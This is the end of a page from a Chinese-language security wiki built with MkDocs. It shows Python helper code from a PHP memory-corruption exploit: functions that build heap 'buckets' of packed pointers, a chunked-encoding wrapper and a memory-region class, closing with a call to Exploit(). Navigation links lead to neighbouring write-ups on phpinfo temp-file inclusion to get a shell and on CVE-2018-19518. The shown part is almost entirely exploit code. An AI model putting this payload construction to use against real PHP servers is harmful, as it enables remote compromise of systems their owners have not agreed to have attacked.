<span class="k">def</span><span class="w"> </span><span class="nf">ptr_bucket</span><span class="p">(</span><span class="o">*</span><span class="n">ptrs</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="kc">None</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Creates a 0x8000 chunk that reveals pointers after every step has been ran.&quot;&quot;&quot;</span>
    <span class="k">if</span> <span class="n">size</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
        <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">ptrs</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">==</span> <span class="n">size</span>
    <span class="n">bucket</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="n">p64</span><span class="p">,</span> <span class="n">ptrs</span><span class="p">))</span>
    <span class="n">bucket</span> <span class="o">=</span> <span class="n">qpe</span><span class="p">(</span><span class="n">bucket</span><span class="p">)</span>
    <span class="n">bucket</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">bucket</span><span class="p">)</span>
    <span class="n">bucket</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">bucket</span><span class="p">)</span>
    <span class="n">bucket</span> <span class="o">=</span> <span class="n">chunked_chunk</span><span class="p">(</span><span class="n">bucket</span><span class="p">)</span>
    <span class="n">bucket</span> <span class="o">=</span> <span class="n">compressed_bucket</span><span class="p">(</span><span class="n">bucket</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">bucket</span>


<span class="k">def</span><span class="w"> </span><span class="nf">chunked_chunk</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">size</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="kc">None</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Constructs a chunked representation of the given chunk. If size is given, the</span>
<span class="sd">    chunked representation has size `size`.</span>
<span class="sd">    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.</span>
<span class="sd">    &quot;&quot;&quot;</span>
    <span class="c1"># The caller does not care about the size: let&#39;s just add 8, which is more than</span>
    <span class="c1"># enough</span>
    <span class="k">if</span> <span class="n">size</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
        <span class="n">size</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8</span>
    <span class="n">keep</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="n">size</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="n">keep</span><span class="p">,</span> <span class="s2">&quot;0&quot;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">size</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="n">data</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span>


<span class="nd">@dataclass</span>
<span class="k">class</span><span class="w"> </span><span class="nc">Region</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;A memory region.&quot;&quot;&quot;</span>

    <span class="n">start</span><span class="p">:</span> <span class="nb">int</span>
    <span class="n">stop</span><span class="p">:</span> <span class="nb">int</span>
    <span class="n">permissions</span><span class="p">:</span> <span class="nb">str</span>
    <span class="n">path</span><span class="p">:</span> <span class="nb">str</span>

    <span class="nd">@property</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">size</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">stop</span> <span class="o">-</span> <span class="bp">self</span><span class="o">.</span><span class="n">start</span>


<span class="n">Exploit</span><span class="p">()</span>
</code></pre></div>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../PHP%20%E5%88%A9%E7%94%A8%20phpinfo%20%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%20getshell/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../PHP%20%E5%88%A9%E7%94%A8%20phpinfo%20%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%20getshell/" class="btn btn-xs btn-link">
        PHP 利用 phpinfo 包含临时文件 getshell
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../PHP%20imap%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2018-19518/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../PHP%20imap%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2018-19518/" class="btn btn-xs btn-link">
        PHP imap 远程命令执行漏洞 CVE-2018-19518
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>